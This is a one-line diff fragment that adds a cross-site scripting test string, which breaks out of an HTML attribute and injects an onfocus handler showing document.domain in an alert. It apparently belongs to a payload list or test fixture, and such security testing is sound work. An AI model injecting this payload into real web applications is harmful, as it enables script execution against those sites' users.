@@ -1,0 +1,1 @@
+`xplo1t" autofocus onfocus=alert(document.domain)`
